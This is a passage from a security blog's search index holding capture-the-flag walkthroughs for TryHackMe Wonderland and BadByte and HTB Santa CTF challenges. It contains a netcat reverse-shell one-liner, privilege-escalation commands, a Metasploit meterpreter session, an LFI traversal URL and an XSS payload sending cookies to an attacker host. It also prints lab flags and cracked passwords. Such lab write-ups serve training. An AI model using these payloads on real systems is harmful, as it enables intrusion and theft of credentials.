/tmp/f;cat /tmp/f|sh -i 2&amp;gt;&amp;amp;1|nc 10.9.1.250 4444 &amp;gt;/tmp/f Add your ip and port [ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&amp;gt;&amp;amp;1|nc (IP) (PORT) &amp;gt;/tmp/f ] Start a python3 server └─$ python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.10.120.231 - - [02/Feb/2022 18:17:05] &quot;GET /downloads/src/buildscript.sh HTTP/1.1&quot; 200 - Start netcat listener Wait around 1 minute to get root shell" }, { "title": "TryHackMe Wonderland Walkthrough", "url": "/posts/Wonderland/", "categories": "thm", "tags": "thm", "date": "2022-01-31 15:15:00 +0530", "snippet": "Wonderland WriteupPort Scan└─$ cat nmap_results 1 ⨯Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-30 18:59 ISTNmap scan report for 10.10.82.194 (10.10.82.194)Host is up (0.21s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)| 256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)|_ 256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)|_http-title: Follow the white rabbit.Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 20.06 secondsDirectory Scan└─$ feroxbuster -u http://10.10.82.194/ -w /usr/share/wordlists/dirb/big.txt ___ ___ __ __ __ __ __ ___|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___by Ben &quot;epi&quot; Risher ver: 2.4.0───────────────────────────┬────────────────────── Target Url │ http://10.10.82.194/ Threads │ 50 Wordlist │ /usr/share/wordlists/dirb/big.txt Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] Timeout (secs) │ 7 User-Agent │ feroxbuster/2.4.0 Config File │ /etc/feroxbuster/ferox-config.toml Recursion Depth │ 4 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™──────────────────────────────────────────────────301 0l 0w 0c http://10.10.82.194/img301 0l 0w 0c http://10.10.82.194/poem301 0l 0w 0c http://10.10.82.194/r301 0l 0w 0c http://10.10.82.194/r/a301 0l 0w 0c http://10.10.82.194/r/a/b301 0l 0w 0c http://10.10.82.194/r/a/b/b[####################] - 4m 122808/122808 0s found:6 errors:0 [####################] - 2m 20468/20468 146/s http://10.10.82.194/[####################] - 2m 20468/20468 126/s http://10.10.82.194/img[####################] - 2m 20468/20468 116/s http://10.10.82.194/poem[####################] - 2m 20468/20468 116/s http://10.10.82.194/r[####################] - 2m 20468/20468 129/s http://10.10.82.194/r/a[####################] - 1m 20468/20468 170/s http://10.10.82.194/r/a/b the url was made with word rabbit Visiting http://10.10.82.194/r/a/b/b/i/t/ gave ssh password in the source code (view-source:http://10.10.82.194/r/a/b/b/i/t/)User flag The hint said everything&#39;s upside down here, as root.txt was in user’s directory, the user.txt was in root directoryalice@wonderland:~$ cat /root/user.txtthm{&amp;lt;--SNIPPED--&amp;gt;}User raabit sudo -lalice@wonderland:~$ sudo -l[sudo] password for alice: Matching Defaults entries for alice on wonderland: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser alice may run the following commands on wonderland: (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py The current directory had a python file that imports random library We should create a file random.py so python would take it executes itimport osos.system(&#39;/bin/bash&#39;) Save the prgm with name random.py Run italice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.pyrabbit@wonderland:~$ ls__pycache__ random.py root.txt walrus_and_the_carpenter.pyrabbit@wonderland:~$ whoamirabbitUser hatter The binary teaParty had suid bitrabbit@wonderland:/home/rabbit$ lsteaPartyrabbit@wonderland:/home/rabbit$ ./teaParty Welcome to the tea party!The Mad Hatter will be here soon.Probably by Mon, 31 Jan 2022 10:11:17 +0000Ask very nicely, and I will give you some tea while you wait for himsureSegmentation fault (core dumped) strings wasn’t installed on the machine so I used python server and took that file on my local machine└─$ strings teaParty /lib64/ld-linux-x86-64.so.22U~4libc.so.6setuidputsgetcharsystem__cxa_finalizesetgid__libc_start_mainGLIBC_2.2.5_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTableu/UH[]A\\A]A^A_Welcome to the tea party!The Mad Hatter will be here soon./bin/echo -n &#39;Probably by &#39; &amp;amp;&amp;amp; date --date=&#39;next hour&#39; -RAsk very nicely, and I will give you some tea while you wait for himSegmentation fault (core dumped);*3$&quot;GCC: (Debian 8.3.0-6) 8.3.0&amp;lt;--SNIPPED--&amp;gt; The binary uses date for throwing out the time /bin/echo -n &#39;Probably by &#39; &amp;amp;&amp;amp; date --date=&#39;next hour&#39; -R we can use same methodology as previous peivilege escalation create a file name date and add it to $PATH variablerabbit@wonderland:/home/rabbit$ cat date#!/bin/bashpython3 ../alice/random.py I’ve used random.py file which we used earlier, you can replace the python3 line with /bin/bash Run the file to get hatter user rabbit@wonderland:/home/rabbit$ lsdate teaPartyrabbit@wonderland:/home/rabbit$ chmod +x date rabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit:$PATHrabbit@wonderland:/home/rabbit$ ./teaParty Welcome to the tea party!The Mad Hatter will be here soon.Probably by hatter@wonderland:/home/rabbit$ password file The hatter’s directory had password file for the user hatterhatter@wonderland:/home/hatter$ cat password.txt &amp;lt;--SNIPPED--&amp;gt;hatter@wonderland:/home/hatter$ iduid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit) We still have group id as rabbit use the password to escalate privileges : ssh hatter@localhosthatter@wonderland:~$ iduid=1003(hatter) gid=1003(hatter) groups=1003(hatter)Root User Checked for capabilitieshatter@wonderland:~$ getcap -r / 2&amp;gt;/dev/null/usr/bin/perl5.26.1 = cap_setuid+ep/usr/bin/mtr-packet = cap_net_raw+ep/usr/bin/perl = cap_setuid+ep Perl has an setuid GTFO bins have payload for capabilities, suid, sudo, etc : https://gtfobins.github.io/gtfobins/perl/ Use perl -e &#39;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/sh&quot;;&#39; to get root shellhatter@wonderland:~$ perl -e &#39;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/sh&quot;;&#39;# id uid=0(root) gid=1003(hatter) groups=1003(hatter)# cat /home/alice/root.txtthm{&amp;lt;--SNIPPED--&amp;gt;}" }, { "title": "TryHackMe BadByte Walkthrough", "url": "/posts/BadByte/", "categories": "thm", "tags": "thm", "date": "2022-01-26 16:00:00 +0530", "snippet": "Machine name : BadByteAn easy machine from tryhackme that covers basic port scanning, cracking ssh passwords, ssh port forwading, basic enumeration, reading log files and privilege escalationReconnaissance I’ve used rustscan for the scan└─$ rustscan -a 10.10.184.227 -- -sC -sV.----. .-. .-. .----..---. .----. .---. .--. .-. .-.| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| || .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ |`-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39;The Modern Day Port Scanner.________________________________________: https://discord.gg/GFrQsGy :: https://github.com/RustScan/RustScan : --------------------------------------Real hackers hack time ⌛[~] The config file is expected to be at &quot;/home/devcli3nt/.rustscan.toml&quot;[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers[!] Your file limit is very small, which negatively impacts RustScan&#39;s speed. Use the Docker image, or up the Ulimit with &#39;--ulimit 5000&#39;. Open 10.10.184.227:22Open 10.10.184.227:30024[~] Starting Script(s)[&amp;gt;] Script to be run Some(&quot;nmap -vvv -p &quot;)PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 f3:a2:ed:93:4b:9c:bf:bb:33:4d:48:0d:fe:a4:de:96 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9/A7kkuN5E+SS1C6w1NfeY196Rj4Y1Yx7njNCwNaCgIv8m+V+7MTHsRn3txLXRTHXErMqW3ypCmmjuY3O40kAragZSgA/XhdesGxGVa0szHK7H4fB28uQiyZgkOfIt/12kGaHB3iGwOeex2Hdg6ct4FdxTWKgDvuKZSLVoPXG66R8SOHql2cXfUtzyUMNJTTqoUED69soEJVG2ctfPKXi4BfFqM3OK2HgKzbmcSPXlLUTNhlcvjPuTa0kMRqiNTMVdP0PjSFdoaMviXHiznW7Fn6NHe3R/vIQt8Ac05Mdvim21QjRpJ4pm7v5+q1wXCJxGG6Ov71yThKP6yZ4ByMl| 256 22:72:00:36:eb:37:12:9f:5a:cc:c2:73:e0:4f:f1:4e (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM9QUKykbzCSI7+PgoVzHNKOVIWf+zm0LN/f4n0VJc/P0J9TzLImkYHIOCnRFpNUPtiWGXbHXi67FQxEpgZMReo=| 256 78:1d:79:dc:8d:41:f6:77:60:65:f5:74:b6:cc:8b:6d (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKrvf1zJBhqU1RxUCYuTgoIy+7NzCqZeFWV67bt8+APV30024/tcp open ftp syn-ack vsftpd 3.0.3| ftp-anon: Anonymous FTP login allowed (FTP code 230)| -rw-r--r-- 1 ftp ftp 1743 Mar 23 2021 id_rsa|_-rw-r--r-- 1 ftp ftp 78 Mar 23 2021 note.txt| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10.9.2.60| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 4| vsFTPd 3.0.3 - secure, fast, stable|_End of statusService Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 8.21 secondsQuestions How many ports are open? 2 What service is running on the lowest open port? ssh What non-standard port is open? 30024 What service is running on the non-standard port? ftp Foothold Rustscan detected that anonymous login was enabled in FTP└─$ ftp 10.10.184.227 30024 Connected to 10.10.184.227.220 (vsFTPd 3.0.3)Name (10.10.184.227:devcli3nt): anonymous331 Please specify the password.Password:230 Login successful. Geting all the files [ mget* ]ftp&amp;gt; ls200 PORT command successful. Consider using PASV.150 Here comes the directory listing.-rw-r--r-- 1 ftp ftp 1743 Mar 23 2021 id_rsa-rw-r--r-- 1 ftp ftp 78 Mar 23 2021 note.txt226 Directory send OK.ftp&amp;gt; mget *mget id_rsa? y200 PORT command successful. Consider using PASV.150 Opening BINARY mode data connection for id_rsa (1743 bytes).226 Transfer complete.1743 bytes received in 0.00 secs (23.7465 MB/s)mget note.txt? y200 PORT command successful. Consider using PASV.150 Opening BINARY mode data connection for note.txt (78 bytes).226 Transfer complete.78 bytes received in 0.00 secs (1.5827 MB/s) Get username and password└─$ cat note.txt I always forget my password. Just let me store an ssh key here.- errorcauser└─$ locate ssh2john/usr/share/john/ssh2john.py └─$ /usr/share/john/ssh2john.py id_rsa &amp;gt; hashfile └─$ john --wordlist=/usr/share/wordlists/rockyou.txt hashfile Using default input encoding: UTF-8Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashesCost 2 (iteration count) is 2 for all loaded hashesWill run 4 OpenMP threadsNote: This format may emit false positives, so it will keep trying even afterfinding a possible candidate.Press &#39;q&#39; or Ctrl-C to abort, almost any other key for statuscupcake (id_rsa)Warning: Only 2 candidates left, minimum 4 needed for performance.1g 0:00:00:22 DONE (2022-01-27 09:02) 0.04522g/s 648652p/s 648652c/s 648652C/sa6_123..*7¡Vamos!Session completedQuestions What username do we find during the enumeration process? errorcauser What is the passphrase for the RSA private key? cupcake Port Forwarding Create a SSH port forward└─$ ssh -i id_rsa -D 1337 errorcauser@10.10.184.227 # After the connection change socks settings in proxychains └─$ sudo nano /etc/proxychains4.conf # socks5 127.0.0.1 1337 Now run proxychains and nmap to get internal ports information └─$ proxychains nmap -sT 127.0.0.1 [proxychains] config file found: /etc/proxychains4.conf [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4 [proxychains] DLL init: proxychains-ng 4.15 Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-27 09:29 IST [proxychains] Strict chain ... 127.0.0.1:1337 ... 127.0.0.1:80 ... OK [proxychains] Strict chain ... 127.0.0.1:1337 ... 127.0.0.1:22 ... OK [proxychains] Strict chain ... 127.0.0.1:1337 ... 127.0.0.1:445 &amp;lt;--socket error or timeout! [proxychains] Strict chain ... 127.0.0.1:1337 ... 127.0.0.1:8080 &amp;lt;--socket error or timeout! [proxychains] Strict chain ... 127.0.0.1:1337 ... 127.0.0.1:3306 ... OK [proxychains] Strict chain ... 127.0.0.1:1337 ... 127.0.0.1:80 ... OK&amp;lt;--SNIPPED--&amp;gt; Now connect the internal ports via ssh└─$ ssh -L 80:127.0.0.1:80 errorcauser@10.10.184.227 -i id_rsa 130 ⨯Enter passphrase for key &#39;id_rsa&#39;: Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-139-generic x86_64) &amp;lt;--SNIPPED--&amp;gt;Questions What main TCP ports are listening on localhost? 80,3306 What protocols are used for these ports? http,mysql Web Exploitation Scan port 80└─$ nmap -p 80 127.0.0.1 -sC -sVStarting Nmap 7.91 ( https://nmap.org ) at 2022-01-27 09:41 ISTNmap scan report for localhost (127.0.0.1)Host is up (0.00017s latency).PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-generator: WordPress 5.7|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: BadByte &amp;amp;#8211; You&amp;amp;#039;re looking at me, but they are lookin...Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 11.46 seconds Enumeration└─$ nmap -p 80 --script http-wordpress-enum --script-args type=&quot;plugins&quot;,search-limit=1500 127.0.0.1 1 ⚙Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-27 09:46 ISTNmap scan report for localhost (127.0.0.1)Host is up (0.00017s latency).PORT STATE SERVICE80/tcp open http| http-wordpress-enum: | Search limited to top 1500 themes/plugins| plugins| duplicator 1.3.26|_ wp-file-manager 6.0Nmap done: 1 IP address (1 host up) scanned in 9.83 seconds ABOUT DUPLICATOR VULN : https://www.exploit-db.com/exploits/50420 Duplicator is basically LFI 127.0.0.1/wp-admin/admin-ajax.php?action=duplicator_download&amp;amp;file=../../../../../../../../etc/passwd User shellmsf6 &amp;gt; use 0[*] Using configured payload php/meterpreter/reverse_tcpmsf6 exploit(multi/http/wp_file_manager_rce) &amp;gt; set RHOSTS 127.0.0.1RHOSTS =&amp;gt; 127.0.0.1msf6 exploit(multi/http/wp_file_manager_rce) &amp;gt; set LHOST 10.9.2.60LHOST =&amp;gt; 10.9.2.60msf6 exploit(multi/http/wp_file_manager_rce) &amp;gt; run[*] Started reverse TCP handler on 10.9.2.60:4444 [*] Executing automatic check (disable AutoCheck to override)[+] The target appears to be vulnerable.[*] 127.0.0.1:80 - Payload is at /wp-content/plugins/wp-file-manager/lib/files/CMRdTO.php[*] Sending stage (39282 bytes) to 10.10.184.227[+] Deleted CMRdTO.php[*] Meterpreter session 1 opened (10.9.2.60:4444 -&amp;gt; 10.10.184.227:58718) at 2021-05-03 19:42:28 +0200Questions What CMS is running on the machine? wordpress What is the CVE number for directory traversal vulnerability? CVE-2020-11738 What is the CVE number for remote code execution vulnerability? CVE-2020-25213 What is the name of user that was running CMS? cth -What is the user flag? THM{227906201d17d9c45aa93d0122ea1af7}Privilege Escalation The old password was stored in cat /var/log/bash.log : [ G00dP@$sw0rd2020 ] cth@badbyte:/home$ sudo -lsudo -l[sudo] password for cth: G00dP@$sw0rd2021Matching Defaults entries for cth on badbyte: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser cth may run the following commands on badbyte: (ALL : ALL) ALLcth@badbyte:/home$ sudo -ssudo -sroot@badbyte:~# cat root.txtcat root.txt | ______ ________ ________ ______ _____________ __________ | | / ____ \\ / ___ \\ / ____ \\ / ____ \\ /____ ____// ______/\\ | | / /___/_/ / /__/ // / / /\\ / /___/_/ \\___/ /\\___/ /______\\/ | | / _____ \\ / ____ // / / / / / _____ \\ __ ___ / / / / ____/\\ | | / /____/ // / __/ // /___/ / / / /____/ // | / // / / / /____\\/ | | /________//__/ / /__//_________/ / /________/ | \\/ //___/ / / /________ | | \\________\\\\__\\/ \\__\\\\_________\\/ \\________\\ \\ / \\___\\/ /____________/\\ | | _________ __/ / / \\____________\\/ | | /________/\\ /_____/ / | | \\________\\/ \\_____\\/ |THM{ad485b44f63393b6a9225974909da5fa}Questions What is the user’s old password? G00dP@$sw0rd2020 What is the root flag? THM{ad485b44f63393b6a9225974909da5fa} " }, { "title": "HTB Santa CTF DAY 1 ", "url": "/posts/DAY1/", "categories": "ctf", "tags": "ctf, htb", "date": "2022-01-16 01:30:00 +0530", "snippet": "Toy Workshop [ Web ]Homepage The homepage had nothing intrestingSource Code /web_toy_workshop/challenge/routes/index.js&amp;lt;--SNIPPED--&amp;gt;router.post(&#39;/api/submit&#39;, async (req, res) =&amp;gt; { const { query } = req.body; if(query){ return db.addQuery(query) .then(() =&amp;gt; { bot.readQueries(db); res.send(response(&#39;Your message is delivered successfully!&#39;)); }); } return res.status(403).send(response(&#39;Please write your query first!&#39;));});&amp;lt;--SNIPPED--&amp;gt; So we have to send our query ( json data ) in /api/submit It’s a XSSSolutionPOST /api/submit HTTP/1.1Host: 46.101.20.5:31726Content-Type:application/jsonContent-Length: 130{ &quot;query&quot;:&quot;&amp;lt;img src=x onerror=this.src=&#39;&amp;lt;IP&amp;gt;/c?&#39;+document.cookie;&amp;gt;&quot;} I used python3 http server with ngrok ( appended the link in )Flag After you sent the the POST request to the website, It will use the query and store it in it’s database, and retrive the flag ( cookie ) for us Start the python3 server , use ngrok , update the query # flag : HTB{3v1l_3lv3s_4r3_r1s1ng_up!}Common Mistake [ Crypto ]Challenge files Hex values{&#39;n&#39;: &#39;0xa96e6f96f6aedd5f9f6a169229f11b6fab589bf6361c5268f8217b7fad96708cfbee7857573ac606d7569b44b02afcfcfdd93c21838af933366de22a6116a2a3dee1c0015457c4935991d97014804d3d3e0d2be03ad42f675f20f41ea2afbb70c0e2a79b49789131c2f28fe8214b4506db353a9a8093dc7779ec847c2bea690e653d388e2faff459e24738cd3659d9ede795e0d1f8821fd5b49224cb47ae66f9ae3c58fa66db5ea9f73d7b741939048a242e91224f98daf0641e8a8ff19b58fb8c49b1a5abb059f44249dfd611515115a144cc7c2ca29357af46a9dc1800ae9330778ff1b7a8e45321147453cf17ef3a2111ad33bfeba2b62a047fa6a7af0eef&#39;, &#39;e&#39;: &#39;0x10001&#39;, &#39;ct&#39;: &#39;0x55cfe232610aa54dffcfb346117f0a38c77a33a2c67addf7a0368c93ec5c3e1baec9d3fe35a123960edc2cbdc238f332507b044d5dee1110f49311efc55a2efd3cf041bfb27130c2266e8dc61e5b99f275665823f584bc6139be4c153cdcf153bf4247fb3f57283a53e8733f982d790a74e99a5b10429012bc865296f0d4f408f65ee02cf41879543460ffc79e84615cc2515ce9ba20fe5992b427e0bbec6681911a9e6c6bbc3ca36c9eb8923ef333fb7e02e82c7bfb65b80710d78372a55432a1442d75cad5b562209bed4f85245f0157a09ce10718bbcef2b294dffb3f00a5a804ed7ba4fb680eea86e366e4f0b0a6d804e61a3b9d57afb92ecb147a769874&#39;}{&#39;n&#39;: &#39;0xa96e6f96f6aedd5f9f6a169229f11b6fab589bf6361c5268f8217b7fad96708cfbee7857573ac606d7569b44b02afcfcfdd93c21838af933366de22a6116a2a3dee1c0015457c4935991d97014804d3d3e0d2be03ad42f675f20f41ea2afbb70c0e2a79b49789131c2f28fe8214b4506db353a9a8093dc7779ec847c2bea690e653d388e2faff459e24738cd3659d9ede795e0d1f8821fd5b49224cb47ae66f9ae3c58fa66db5ea9f73d7b741939048a242e91224f98daf0641e8a8ff19b58fb8c49b1a5abb059f44249dfd611515115a144cc7c2ca29357af46a9dc1800ae9330778ff1b7a8e45321147453cf17ef3a2111ad33bfeba2b62a047fa6a7af0eef&#39;, &#39;e&#39;: &#39;0x23&#39;, &#39;ct&#39;: &#39;0x79834ce329453d3c4af06789e9dd654e43c16a85d8ba0dfa443aefe1ab4912a12a43b44f58f0b617662a459915e0c92a2429868a6b1d7aaaba500254c7eceba0a2df7144863f1889fab44122c9f355b74e3f357d17f0e693f261c0b9cefd07ca3d1b36563a8a8c985e211f9954ce07d4f75db40ce96feb6c91211a9ff9c0a21cad6c5090acf48bfd88042ad3c243850ad3afd6c33dd343c793c0fa2f98b4eabea399409c1966013a884368fc92310ebcb3be81d3702b936e7e883eeb94c2ebb0f9e5e6d3978c1f1f9c5a10e23a9d3252daac87f9bb748c961d3d361cc7dacb9da38ab8f2a1595d7a2eba5dce5abee659ad91a15b553d6e32d8118d1123859208&#39;} Integer valuesn = 21388731509885000178627064516258054470260331371598943108291856742436111736828979864010924669228672392691259110152052179841234423220373839350729519449867096270377366080249815393746878871366061153796079471618562067885157333408378773203102328726963273544788844541658368239189745882391132838451159906995037703318134437625750463265571575001855682002307507556141914223053440116920635522540306152978955166077383503077296996797116492665606386925464305499727852298454712455680910133707466125522128546462287576144499756117801116464261543533542827392699481765864054797509983998681705356909524163419157085924159390221747612487407e1 = 65537e2 = 35c1 = 10832767136661619622293208748444962392355211301390434120939858183061348121126484914263671262032603875084667844823015664447375648718327494489656817860025737727356822703892293211022320699697919627907394583787345038714333739600698382532854618636094930253033489471351451429607353151015568123268427367950348329135569722792929241394325167453525160818746481257803112384890621897151307914147207385945644054978785846514561379487923125221730977998641404608153621221989242862072038048891093337039913905830269768414927334743978508494831586214464123847828971941221037875260516473982025116976142753481691811417555124564400023181428c2 = 15339581512280546253022387613330506135473528946217386214104392886174532962135139018179028980415602501799731665623533337161466343141774695260798342966907592969192136730428838101668117599627074424456369362732331025534652310626217911372168741784410233370188819015541694457313359727564553135243865091813543574169503409997765186767976316668351998243685484183615633052413572395870658899189135714137152486690320920884963915388873421509027812888500063744545503640233833759600980489533968220839778372130766115290961393758948141655306677776381429819578626575875511596616706688649422193432129579216085481063417748767088461582856Solution The encryption flag has 2 modulus with same flag ( message ) The attack used to get the flag is Common Modulus Attack Learn more about this attack : https://infosecwriteups.com/rsa-attacks-common-modulus-7bdb34f331a5Solve.pyimport gmpy2from Crypto.Util.number import *n = 21388731509885000178627064516258054470260331371598943108291856742436111736828979864010924669228672392691259110152052179841234423220373839350729519449867096270377366080249815393746878871366061153796079471618562067885157333408378773203102328726963273544788844541658368239189745882391132838451159906995037703318134437625750463265571575001855682002307507556141914223053440116920635522540306152978955166077383503077296996797116492665606386925464305499727852298454712455680910133707466125522128546462287576144499756117801116464261543533542827392699481765864054797509983998681705356909524163419157085924159390221747612487407e1 = 65537e2 = 35c1 = 10832767136661619622293208748444962392355211301390434120939858183061348121126484914263671262032603875084667844823015664447375648718327494489656817860025737727356822703892293211022320699697919627907394583787345038714333739600698382532854618636094930253033489471351451429607353151015568123268427367950348329135569722792929241394325167453525160818746481257803112384890621897151307914147207385945644054978785846514561379487923125221730977998641404608153621221989242862072038048891093337039913905830269768414927334743978508494831586214464123847828971941221037875260516473982025116976142753481691811417555124564400023181428c2 = 15339581512280546253022387613330506135473528946217386214104392886174532962135139018179028980415602501799731665623533337161466343141774695260798342966907592969192136730428838101668117599627074424456369362732331025534652310626217911372168741784410233370188819015541694457313359727564553135243865091813543574169503409997765186767976316668351998243685484183615633052413572395870658899189135714137152486690320920884963915388873421509027812888500063744545503640233833759600980489533968220839778372130766115290961393758948141655306677776381429819578626575875511596616706688649422193432129579216085481063417748767088461582856def egcd(a, b): if (a == 0): return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y) def neg_pow(a, b, n): assert b &amp;lt; 0 assert GCD(a, n) == 1 res = int(gmpy2.invert(a, n)) res = pow(res, b*(-1), n) return resdef common_modulus(e1, e2, n, c1, c2): g, a, b = egcd(e1, e2) if a &amp;lt; 0: c1 = neg_pow(c1, a, n) else: c1 = pow(c1, a, n) if b &amp;lt; 0: c2 = neg_pow(c2, b, n) else: c2 = pow(c2, b, n) ct = c1*c2 % n m = int(gmpy2.iroot(ct, g)[0]) return long_to_bytes(m)print(common_modulus(e1, e2, n, c1, c2).decode())# Flag : HTB{c0mm0n_m0d_4774ck_15_4n07h3r_cl4ss1c}Giftwrap [ Reversing ]This is day 2 challengeBinary Info└─$ strings giftwrap &amp;lt;--SNIPPED--&amp;gt;A ?unG7FA tewho1D=ddr}643ePb+4%to]&quot;-id%ABI-02.OZoAIX5ot +.bss!$_\\K[lbO16 8,6H_^lOWs:m/UPX!UPX! by using strings we get to know the binary is compressed by UPX What is UPX ? UPX achieves an excellent compression ratio and offers very fast decompression. Your executables suffer no memory overhead or other drawbacks for most of the formats supported, because of in-place decompression Decompressing the binary└─$ upx -d giftwrap Ultimate Packer for eXecutables Copyright (C) 1996 - 2020UPX 3.96 Markus Oberhumer, Laszlo Molnar &amp;amp; John Reiser Jan 23rd 2020 File size Ratio Format Name -------------------- ------ ----------- ----------- 925312 &amp;lt;- 357628 38.65% linux/amd64 giftwrapUnpacked 1 file.Analyzing Binary└─$ ./giftwrap What&#39;s the magic word? asdfWrong password! Who are you?!? The binary is a typical crackme challenge Let’s boot up the binary in ghidra Main function Each character of the user input is xored with 0xf3&amp;lt;--SNIPPED--&amp;gt;printf(&quot;What\\&#39;s the magic word? &quot;); __isoc99_scanf(&quot;%256s&quot;,&amp;amp;user_input); local_11c = 0; while (local_11c &amp;lt; 0x100) { *(byte *)((long)&amp;amp;user_input + (long)(int)local_11c) = *(byte *)((long)&amp;amp;user_input + (long)(int)local_11c) ^ 0xf3; local_11c = local_11c + 1; } iVar1 = thunk_FUN_004010e6(CHECK,&amp;amp;user_input,0x17); if (iVar1 == 0) { puts(&quot;Welcome inside...&quot;); } else { puts(&quot;Wrong password! Who are you?!?&quot;); } After xoring the value ( xored input ) is compared with CHECK variableSolution Let’s the data stored in CHECK variable CHECK XREF[3]: Entry Point(*), main:004019fa(*), main:00401a01(*) 004cc0f0 bb a7 b1 undefine 88 86 83 8b ac c7 004cc0f0 bb undefined1BBh [0] XREF[3]: Entry Point(*), main:004019fa(*), main:00401a01(*) 004cc0f1 a7 undefined1A7h [1] 004cc0f2 b1 undefined1B1h [2] 004cc0f3 88 undefined188h [3] 004cc0f4 86 undefined186h [4] 004cc0f5 83 undefined183h [5] 004cc0f6 8b undefined18Bh [6] 004cc0f7 ac undefined1ACh [7] 004cc0f8 c7 undefined1C7h [8] 004cc0f9 c2 undefined1C2h [9] 004cc0fa 9d undefined19Dh [10] 004cc0fb 87 undefined187h [11] 004cc0fc ac undefined1ACh [12] 004cc0fd c6 undefined1C6h [13] 004cc0fe c3 undefined1C3h [14] 004cc0ff ac undefined1ACh [15] 004cc100 9b undefined19Bh [16] 004cc101 c7 undefined1C7h [17] 004cc102 81 undefined181h [18] 004cc103 97 undefined197h [19] 004cc104 d2 undefined1D2h [20] 004cc105 d2 undefined1D2h [21] 004cc106 8e undefined18Eh [22] 004cc107 00 undefined100h [23] Let’s store the CHECK values locally and xor it with 0xf3 to get flagsolve.pycheck_values = &#39;bb a7 b1 88 86 83 8b ac c7 c2 9d 87 ac c6 c3 ac 9b c7 81 97 d2 d2 8e 00&#39;.split(&#39; &#39;)int_values = [int(i,16) for i in check_values]flag = &#39;&#39;.join([chr(i ^ 0xf3) for i in int_values])print(flag)Flag└─$ ./giftwrap What&#39;s the magic word? HTB{upx_41nt_50_h4rd!!}óWelcome inside...# flag : HTB{upx_41nt_50_h4rd!!}óMr Snowy [ Pwn ]SolutionChecksec The NX is enabled which makes the stack unexecutabble THe PIE is disabled so we dont have to find the address The binary is just a simple bufferoverflowFunctions of the binary hasMain function The main funciton after executing calls 3 functions , let’s checkout the snowman functionIt’s quiet difficult to do the task only with asm , I’ve used Ghidra which has a feature of converting ( almost same ) asm back to the original C codeSnowman Functionvoid snowman(void){ int iVar1; char local_48 [64]; printstr(&quot;\\n[*] This snowman looks sus..\\n\\n1. Investigate 🔎\\n2. Let it be ⛄\\n&amp;gt; &quot;); fflush(stdout); read(0,local_48,2); iVar1 = atoi(local_48); if (iVar1 != 1) { printstr(&quot;[*] It\\&#39;s just a cute snowman after all, nothing to worry about..\\n&quot;); color(&quot;\\n[-] Mission failed!\\n&quot;,&amp;amp;DAT_0040161a,&amp;amp;DAT_00401664); /* WARNING: Subroutine does not return */ exit(-0x45); } investigate(); return;} This code is basically the first part When option 1 is selected it calls antoher funtion : investigate() Inverstigate Functionvoid investigate(void){ int iVar1; char local_48 [64]; fflush(stdout); printstr( 